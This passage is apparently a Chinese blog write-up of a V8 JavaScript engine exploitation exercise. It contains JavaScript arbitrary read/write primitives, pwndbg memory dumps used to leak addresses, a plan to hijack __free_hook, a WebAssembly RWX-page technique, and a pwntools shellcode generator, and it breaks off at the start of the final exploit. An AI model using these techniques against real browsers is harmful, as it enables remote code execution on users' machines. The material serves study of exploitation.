0x10</code>的位置。</p><p>又因为可以任意修改这一部分的内容，所以我们可以修改<code>elements</code>指针，使其指向任意地址配合<code>fake_obj</code>对象即可达到任意地址读取的效果。</p><h4 id="5-实现任意地址写"><a href="#5-实现任意地址写" class="headerlink" title="5. 实现任意地址写"></a><strong>5. 实现任意地址写</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = address_of(buffer) - <span class="number">1n</span> + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_write</span>(<span class="params">address, value</span>) </span>&#123;</span><br><span class="line">  arb_rw_arr[<span class="number">2</span>] = i2f(buf_backing_store_addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">  fake_obj[<span class="number">0</span>] = address;</span><br><span class="line">  data_view.setFloat64(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>任意地址写的写法在一开始的想法肯定是和任意地址读一致。不过按照上面那样写会出现一个段错误，这是简单的<code>write FloatArray</code>对浮点数的处理方式造成的，当值以 0x7f 开头等高处的地址都会出现这种问题。为了避免选择使用<code>DataView</code>来处理。</p><p><code>DataView</code>对象偏移<code>+0x20</code>处，存有一个<code>backing_store</code>指针，该指针指向真正存储数据的地址，改写这个指针即可任意读写。</p><h4 id="最终利用-传统方式"><a href="#最终利用-传统方式" class="headerlink" title="最终利用: 传统方式"></a><strong>最终利用: 传统方式</strong></h4><p>传统的方式是对<code>__free_hook</code>进行劫持。但是它在libc中，所以首先还是需要考虑泄漏出程序基地址，然后通过got表泄漏出libc地址。</p><p>不过目前遇到的是如何泄漏出程序基地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0fcdcb2c2d99</span><br><span class="line">0xfcdcb2c2d99: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_SMI_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x046dfe5804d1 &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: 0x1bc536f80609 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors (own) #1: 0x08ad62ed1f49 &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions #1: 0x08ad62ed1e59 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line">     0x046dfe584ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_SMI_ELEMENTS) -&gt; 0x0fcdcb2c2e89 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x08ad62ed1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x08ad62ed0ec1 &lt;JSFunction Array (sfi = 0x1bc536f86791)&gt;</span><br><span class="line"> - dependent code: 0x046dfe5802c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure><p>这里随便查看一个<code>JSArray</code>内部的map，可以看到其中包含这<code>constructor</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x08ad62ed0ec1</span><br><span class="line">0x8ad62ed0ec1: [Function] in OldSpace</span><br><span class="line"> - map: 0x0fcdcb2c2d49 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x08ad62ec2109 &lt;JSFunction (sfi = 0x1bc536f83b29)&gt;</span><br><span class="line"> - elements: 0x046dfe580c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: 0x08ad62ed1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - initial_map: 0x0fcdcb2c2d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt;</span><br><span class="line"> - shared_info: 0x1bc536f86791 &lt;SharedFunctionInfo Array&gt;</span><br><span class="line"> - name: 0x046dfe583599 &lt;String[#5]: Array&gt;</span><br><span class="line"> - builtin: ArrayConstructor</span><br><span class="line"> - formal_parameter_count: 65535</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: 0x08ad62ec1869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - code: 0x3eadb8bc6981 &lt;Code BUILTIN ArrayConstructor&gt;</span><br><span class="line"> - properties: 0x08ad62ed1029 &lt;PropertyArray[6]&gt; &#123;</span><br><span class="line">    #length: 0x1bc536f804b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #name: 0x1bc536f80449 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #prototype: 0x1bc536f80529 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    0x046dfe584c79 &lt;Symbol: (native_context_index_symbol)&gt;: 11 (const data field 0) properties[0]</span><br><span class="line">    0x046dfe584f41 &lt;Symbol: Symbol.species&gt;: 0x08ad62ed0fd9 &lt;AccessorPair&gt; (const accessor descriptor)</span><br><span class="line">    #isArray: 0x08ad62ed1069 &lt;JSFunction isArray (sfi = 0x1bc536f86829)&gt; (const data field 1) properties[1]</span><br><span class="line">    #from: 0x08ad62ed10a1 &lt;JSFunction from (sfi = 0x1bc536f86879)&gt; (const data field 2) properties[2]</span><br><span class="line">    #of: 0x08ad62ed10d9 &lt;JSFunction of (sfi = 0x1bc536f868b1)&gt; (const data field 3) properties[3]</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>继续跟进<code>constructor</code>可以看到有一个成员为code</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0x3eadb8bc6981-1</span><br><span class="line">0x3eadb8bc6980:0x0000046dfe580a310x0000046dfe582c01</span><br><span class="line">0x3eadb8bc6990:0x0000046dfe580c710x0000046dfe582791</span><br><span class="line">0x3eadb8bc69a0:0x00001bc536f916a90x800001c60000000d</span><br><span class="line">0x3eadb8bc69b0:0x000000240000001c0x000000a600000024</span><br><span class="line">0x3eadb8bc69c0:0x55a5afef9780ba490x000000e2ff410000</span><br><span class="line">0x3eadb8bc69d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x3eadb8bc69e0:0x0000046dfe580a310x0000046dfe582c01</span><br><span class="line">0x3eadb8bc69f0:0x0000046dfe580c710x0000046dfe582791</span><br><span class="line">0x3eadb8bc6a00:0x00001bc536f916c10x800001c60000000d</span><br><span class="line">0x3eadb8bc6a10:0x0000019f000001880x000000a70000019f</span><br></pre></td></tr></table></figure><p>在内部可以看到在距离开始位置为0x40的位置就能看到心心念念的程序基地址，所以直接通过这里泄漏即可。</p><p>泄漏完基地址就很好办，后续就是通过got表泄漏libc地址，然后劫持<code>__free_hook</code>即可为<code>system</code>，然后创建一个函数中申请变量为想要执行的命令。</p><blockquote><p>  我这里没看过源码，不过我猜测是因为js是动态变量的缘故，js的变量都是以堆的形式存在的，并且在函数执行结束后会释放掉内存。</p></blockquote><h4 id="最终利用-非传统方式"><a href="#最终利用-非传统方式" class="headerlink" title="最终利用: 非传统方式"></a><strong>最终利用: 非传统方式</strong></h4><p>这种方法则是往程序中写shellcode，但是程序自身并没有rwx的段。不过存在这样一种技术wasm，使用 <a class="link"   href="https://wasdk.github.io/WasmFiddle" >这个网站<i class="fas fa-external-link-alt"></i></a> 可以生成一段wasm码，可以用生成一个函数对象：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230627191416891.png"                      alt="image-20230627191416891"                ></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f());</span><br><span class="line">% DebugPrint(f);</span><br><span class="line">% SystemBreak();</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230627191458616.png"                      alt="image-20230627191458616"                ></p><p>当我们运行可以看到确实是返回了42。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x365390d5faf9</span><br><span class="line">0x365390d5faf9: [Function] in OldSpace</span><br><span class="line"> - map: 0x309e6c9c4379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x365390d42109 &lt;JSFunction (sfi = 0x2a087603b29)&gt;</span><br><span class="line"> - elements: 0x2754f1600c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: 0x365390d5fac1 &lt;SharedFunctionInfo 0&gt;</span><br><span class="line"> - name: 0x2754f1604ae1 &lt;String[#1]: 0&gt;</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: 0x365390d41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - code: 0x18b055a42001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - WASM instance 0x365390d5f901</span><br><span class="line"> - WASM function index 0</span><br><span class="line"> - properties: 0x2754f1600c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x02a0876004b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #name: 0x02a087600449 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #arguments: 0x02a087600369 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #caller: 0x02a0876003d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>查看一下这个 f ，可以看到他的类型为<code>JSFunction</code>，继续跟进其中的<code>share_info</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x365390d5fac1</span><br><span class="line">0x365390d5fac1: [SharedFunctionInfo] in OldSpace</span><br><span class="line"> - map: 0x2754f16009e1 &lt;Map[56]&gt;</span><br><span class="line"> - name: 0x2754f1604ae1 &lt;String[#1]: 0&gt;</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - function_map_index: 144</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - expected_nof_properties: 0</span><br><span class="line"> - language_mode: sloppy</span><br><span class="line"> - data: 0x365390d5fa99 &lt;WasmExportedFunctionData&gt;</span><br><span class="line"> - code (from data): 0x18b055a42001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - function token position: -1</span><br><span class="line"> - start position: -1</span><br><span class="line"> - end position: -1</span><br><span class="line"> - no debug info</span><br><span class="line"> - scope info: 0x2754f1600c61 &lt;ScopeInfo[0]&gt;</span><br><span class="line"> - length: 0</span><br><span class="line"> - feedback_metadata: 0x2754f1602a39: [FeedbackMetadata]</span><br><span class="line"> - map: 0x2754f1601319 &lt;Map&gt;</span><br><span class="line"> - slot_count: 0</span><br></pre></td></tr></table></figure><p>继续跟进data。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x365390d5fa99</span><br><span class="line">0x365390d5fa99: [WasmExportedFunctionData] in OldSpace</span><br><span class="line"> - map: 0x2754f1605879 &lt;Map[40]&gt;</span><br><span class="line"> - wrapper_code: 0x18b055a42001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - instance: 0x365390d5f901 &lt;Instance map = 0x309e6c9c9789&gt;</span><br><span class="line"> - function_index: 0</span><br></pre></td></tr></table></figure><p>进一步查看<code>instance</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x365390d5f901-1 20</span><br><span class="line">00:0000│  0x365390d5f900 —▸ 0x309e6c9c9789 ◂— 0x2500002754f16001</span><br><span class="line">01:0008│  0x365390d5f908 —▸ 0x2754f1600c71 ◂— 0x2754f16008</span><br><span class="line">02:0010│  0x365390d5f910 —▸ 0x2754f1600c71 ◂— 0x2754f16008</span><br><span class="line">03:0018│  0x365390d5f918 —▸ 0x7fc28d7f0000 ◂— 0x0</span><br><span class="line">04:0020│  0x365390d5f920 ◂— 0x10000</span><br><span class="line">05:0028│  0x365390d5f928 ◂— 0xffff</span><br><span class="line">06:0030│  0x365390d5f930 —▸ 0x55ec1cb0d818 —▸ 0x7ffd93629d90 ◂— 0x7ffd93629d90</span><br><span class="line">07:0038│  0x365390d5f938 —▸ 0x2754f1600c71 ◂— 0x2754f16008</span><br><span class="line">08:0040│  0x365390d5f940 —▸ 0x55ec1cb931e0 ◂— 0x0</span><br><span class="line">09:0048│  0x365390d5f948 —▸ 0x2754f16004d1 ◂— 0x2754f16005</span><br><span class="line">0a:0050│  0x365390d5f950 ◂— 0x0</span><br><span class="line">... ↓     3 skipped</span><br><span class="line">0e:0070│  0x365390d5f970 —▸ 0x55ec1cb93200 ◂— 0x0</span><br><span class="line">0f:0078│  0x365390d5f978 —▸ 0x2754f16004d1 ◂— 0x2754f16005</span><br><span class="line">10:0080│  0x365390d5f980 —▸ 0x55ec1cb03b50 —▸ 0x2754f1600751 ◂— 0xce00002754f16007</span><br><span class="line">11:0088│  0x365390d5f988 —▸ 0x2ed8b8773000 ◂— movabs r10, 0x2ed8b8773260 /* 0x2ed8b8773260ba49 */</span><br><span class="line">12:0090│  0x365390d5f990 —▸ 0x9e8bdb4e4a1 ◂— 0x710000309e6c9c91</span><br><span class="line">13:0098│  0x365390d5f998 —▸ 0x9e8bdb4e711 ◂— 0x710000309e6c9cad</span><br><span class="line">pwndbg&gt; vmmap 0x2ed8b8773000</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x2ed8b8773000     0x2ed8b8774000 rwxp     1000 0      [anon_2ed8b8773] +0x0</span><br></pre></td></tr></table></figure><p>可以看到在偏移为<code>0x88</code>处有rwx的段了。最后直接写入shellcode即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># https://www.xi4oyu.top/</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">just8</span>(<span class="params">data</span>):</span></span><br><span class="line">    size = <span class="built_in">len</span>(data)</span><br><span class="line">    real_size = size <span class="keyword">if</span> size % <span class="number">8</span> == <span class="number">0</span> <span class="keyword">else</span> size + (<span class="number">8</span> - size % <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> data.ljust(real_size, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_js</span>(<span class="params">data</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;var sc_arr = [&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> (i // <span class="number">8</span>) % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            ret += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        x = u64(data[i:i+<span class="number">8</span>])</span><br><span class="line">        ret += <span class="string">&#x27;\t&#x27;</span> + <span class="built_in">hex</span>(x) + <span class="string">&#x27;n,&#x27;</span></span><br><span class="line">    ret += <span class="string">&#x27;\n]\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_exec</span>(<span class="params">path, argv, envp</span>):</span></span><br><span class="line">    sc = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    sc += shellcraft.pushstr(path)</span><br><span class="line">    sc += shellcraft.mov(<span class="string">&#x27;rdi&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>)</span><br><span class="line">    sc += shellcraft.pushstr_array(<span class="string">&#x27;rsi&#x27;</span>, argv)</span><br><span class="line">    sc += shellcraft.pushstr_array(<span class="string">&#x27;rdx&#x27;</span>, envp)</span><br><span class="line">    sc += shellcraft.syscall(<span class="string">&#x27;SYS_execve&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">sc = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sc = call_exec(<span class="string">&#x27;/usr/bin/xcalc&#x27;</span>, [<span class="string">&#x27;xcalc&#x27;</span>], [<span class="string">&#x27;DISPLAY=:0&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sc)</span><br><span class="line">data = asm(sc)</span><br><span class="line">data = just8(data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(to_js(data))</span><br></pre></td></tr></table></figure><p>上面这是我抄的用于生成js的shellcode的python脚本，在开头留有原作者链接。</p><h3 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> uint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// @param &#123;float64&#125; float_num</span></span><br><span class="line"><span class="comment">// @return &#123;uint64&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">float_num</span>) </span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = float_num;</span><br><span class="line">    <span class="keyword">return</span> uint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span 